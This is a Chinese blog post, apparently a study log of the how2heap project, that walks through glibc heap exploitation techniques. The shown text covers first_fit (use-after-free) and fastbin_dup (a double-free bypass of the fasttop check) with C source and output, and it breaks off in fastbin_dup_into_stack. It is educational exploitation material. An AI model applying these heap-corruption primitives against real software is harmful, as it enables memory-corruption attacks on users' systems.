<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>how2heap 学习 - Lab on Mercury</title><meta name=Description content="Lab on Mercury"><meta property="og:title" content="how2heap 学习"><meta property="og:description" content="距离文章发布两个多月后，终于更新完啦！"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/how2heap/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-12-09T14:36:48+00:00"><meta property="article:modified_time" content="2019-12-09T14:36:48+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="how2heap 学习"><meta name=twitter:description content="距离文章发布两个多月后，终于更新完啦！"><meta name=application-name content="Lab on Mercury"><meta name=apple-mobile-web-app-title content="Lab on Mercury"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.sigmerc.top/how2heap/><link rel=prev href=https://blog.sigmerc.top/glibc-heap/><link rel=next href=https://blog.sigmerc.top/rop-emporium/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"how2heap 学习","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sigmerc.top\/how2heap\/"},"genre":"posts","keywords":"堆漏洞","wordcount":23277,"url":"https:\/\/blog.sigmerc.top\/how2heap\/","datePublished":"2019-12-09T14:36:48+00:00","dateModified":"2019-12-09T14:36:48+00:00","publisher":{"@type":"Organization","name":"Mercury","logo":{"@type":"ImageObject","url":"https:\/\/blog.sigmerc.top\/my_avatar.png","width":400,"height":400}},"author":{"@type":"Person","name":"Mercury"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/><i class="fas fa-archive fa-fw"></i> 文章 </a><a class=menu-item href=/tags/><i class="fas fa-tags fa-fw"></i> 标签 </a><a class=menu-item href=/categories/><i class="fas fa-th fa-fw"></i> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title><i class="fas fa-archive fa-fw"></i>文章</a><a class=menu-item href=/tags/ title><i class="fas fa-tags fa-fw"></i>标签</a><a class=menu-item href=/categories/ title><i class="fas fa-th fa-fw"></i>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">how2heap 学习</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mercury</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/><i class="far fa-folder fa-fw"></i>二进制安全</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2019-12-09>2019-12-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 23277 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 47 分钟&nbsp;<span id=/how2heap/ class=leancloud_visitors data-flag-title="how2heap 学习">
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#first_fit>first_fit</a></li><li><a href=#fastbin_dup>fastbin_dup</a></li><li><a href=#fastbin_dup_into_stack>fastbin_dup_into_stack</a></li><li><a href=#fastbin_dup_consolidate>fastbin_dup_consolidate</a></li><li><a href=#unsafe_unlink>unsafe_unlink</a></li><li><a href=#house_of_spirit>house_of_spirit</a></li><li><a href=#poison_null_byte>poison_null_byte</a></li><li><a href=#house_of_lore>house_of_lore</a></li><li><a href=#overlapping_chunks>overlapping_chunks</a></li><li><a href=#overlapping_chunks_2>overlapping_chunks_2</a></li><li><a href=#house_of_force>house_of_force</a></li><li><a href=#unsorted_bin_into_stack>unsorted_bin_into_stack</a></li><li><a href=#unsorted_bin_attack>unsorted_bin_attack</a></li><li><a href=#large_bin_attack>large_bin_attack</a></li><li><a href=#house_of_einherjar>house_of_einherjar</a></li><li><a href=#house_of_orange>house_of_orange</a></li><li><a href=#calc_tcache_size>calc_tcache_size</a></li><li><a href=#tcache_dup>tcache_dup</a></li><li><a href=#tcache_poisoning>tcache_poisoning</a></li><li><a href=#tcache_house_of_spirit>tcache_house_of_spirit</a></li><li><a href=#house_of_botcake>house_of_botcake</a></li></ul></nav></div></div><div class=content id=content><p>距离文章发布两个多月后，终于更新完啦！</p><h2 id=first_fit>first_fit</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s allocator.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;glibc uses a first-fit algorithm to select a free chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If a chunk is free and large enough, malloc will select this chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This can be exploited in a use-after-free situation.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating 2 buffers. They can be large, don&#39;t have to be fastbin.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>a</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x512</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>b</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(0x512): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(0x256): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;we could continue mallocing here...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;now let&#39;s put a string at a that we can read later </span><span class=se>\&#34;</span><span class=s>this is A!</span><span class=se>\&#34;\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=s>&#34;this is A!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;first allocation %p points to %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the first one...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We don&#39;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;So, let&#39;s allocate 0x500 bytes</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>c</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(0x500): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And put a different string here, </span><span class=se>\&#34;</span><span class=s>this is C!</span><span class=se>\&#34;\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>c</span><span class=p>,</span><span class=s>&#34;this is C!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd allocation %p points to %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;first allocation %p points to %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If we reuse the first allocation, it now holds the data from the third allocation.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s allocator.
</span></span><span class=line><span class=cl>glibc uses a first-fit algorithm to select a free chunk.
</span></span><span class=line><span class=cl>If a chunk is free and large enough, malloc will select this chunk.
</span></span><span class=line><span class=cl>This can be exploited in a use-after-free situation.
</span></span><span class=line><span class=cl>Allocating 2 buffers. They can be large, don&#39;t have to be fastbin.
</span></span><span class=line><span class=cl>1st malloc(0x512): 0x121f010
</span></span><span class=line><span class=cl>2nd malloc(0x256): 0x121f530
</span></span><span class=line><span class=cl>we could continue mallocing here...
</span></span><span class=line><span class=cl>now let&#39;s put a string at a that we can read later&#34;this is A!&#34;
</span></span><span class=line><span class=cl>first allocation 0x121f010 points to this is A!
</span></span><span class=line><span class=cl>Freeing the first one...
</span></span><span class=line><span class=cl>We don&#39;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x121f010
</span></span><span class=line><span class=cl>So, let&#39;s allocate 0x500 bytes
</span></span><span class=line><span class=cl>3rd malloc(0x500): 0x121f010
</span></span><span class=line><span class=cl>And put a different string here, &#34;this is C!&#34;
</span></span><span class=line><span class=cl>3rd allocation 0x121f010 points to this is C!
</span></span><span class=line><span class=cl>first allocation 0x121f010 points to this is C!
</span></span><span class=line><span class=cl>If we reuse the first allocation, it now holds the data from the third allocation.
</span></span></code></pre></td></tr></table></div></div><p>这个例子很简单，由于初始分配给 <code>a</code> 的 <code>0x512</code> 字节刚刚被释放，此时分配一块小于 <code>0x512</code> 字节的内存必定会使用刚才 <code>a</code> 使用的内存区域。注意如果最后使用被释放的指针 <code>a</code>，那么它仍然指向 <code>this is C!</code> 字符串，这就是通常说的 <code>use after free</code>。</p><h2 id=fastbin_dup>fastbin_dup</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates a simple double-free attack with fastbins.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating 3 buffers.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=o>*</span><span class=n>b</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=o>*</span><span class=n>c</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the first one...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If we free %p again, things will crash because %p is at the top of the free list.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// free(a);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;So, instead, we&#39;ll free %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we can free %p again, since it&#39;s not the head of the free list.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the free list has [%p, %p, %p]. If we malloc 3 times, we&#39;ll get %p twice!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>This file demonstrates a simple double-free attack with fastbins.
</span></span><span class=line><span class=cl>Allocating 3 buffers.
</span></span><span class=line><span class=cl>1st malloc(8): 0x17e9010
</span></span><span class=line><span class=cl>2nd malloc(8): 0x17e9030
</span></span><span class=line><span class=cl>3rd malloc(8): 0x17e9050
</span></span><span class=line><span class=cl>Freeing the first one...
</span></span><span class=line><span class=cl>If we free 0x17e9010 again, things will crash because 0x17e9010 is at the top of the free list.
</span></span><span class=line><span class=cl>So, instead, we&#39;ll free 0x17e9030.
</span></span><span class=line><span class=cl>Now, we can free 0x17e9010 again, since it&#39;s not the head of the free list.
</span></span><span class=line><span class=cl>Now the free list has [0x17e9010, 0x17e9030, 0x17e9010]. If we malloc 3 times, we&#39;ll get 0x17e9010 twice!
</span></span><span class=line><span class=cl>1st malloc(8): 0x17e9010
</span></span><span class=line><span class=cl>2nd malloc(8): 0x17e9030
</span></span><span class=line><span class=cl>3rd malloc(8): 0x17e9010
</span></span></code></pre></td></tr></table></div></div><p>这里如果释放 <code>a</code> 后再释放它一次，由于它位于 freelist 顶端过不了安全检查，得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>*** Error in `./a.out&#39;: double free or corruption (fasttop): 0x00000000007aa010 ***
</span></span></code></pre></td></tr></table></div></div><p>这就是我们说的 <code>double free</code>。然而我们第一次释放 <code>a</code> 后如果先释放另一个块 <code>b</code>，那么 <code>b</code> 就会位于 freelist 顶部，此时再次释放 <code>a</code> 就可以绕过 <code>double free</code> 的检测。这样做的结果是最后第一次和第三次 <code>malloc</code> 得到的两个不同指针指向了相同的地址。</p><h2 id=fastbin_dup_into_stack>fastbin_dup_into_stack</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file extends on fastbin_dup.c by tricking malloc into</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	       <span class=s>&#34;returning a pointer to a controlled location (in this case, the stack).</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>stack_var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The address we want malloc() to return is %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>8</span><span class=o>+</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating 3 buffers.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
